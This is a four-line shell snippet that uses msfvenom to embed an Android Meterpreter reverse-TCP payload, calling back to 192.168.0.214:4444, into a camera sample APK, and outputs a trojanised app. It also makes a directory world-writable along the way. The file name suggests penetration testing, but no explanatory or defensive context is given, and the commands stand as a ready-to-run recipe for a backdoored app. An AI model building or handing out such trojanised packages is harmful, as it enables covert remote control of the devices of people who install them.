sudo mkdir -p ~/.local/share/apktool/framework
sudo chmod 777 ~/.local/share/apktool/framework
sudo msfvenom -x CameraSample.apk -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > CameraSample_pen.apk
sudo chmod +x CameraSample_pen.apk
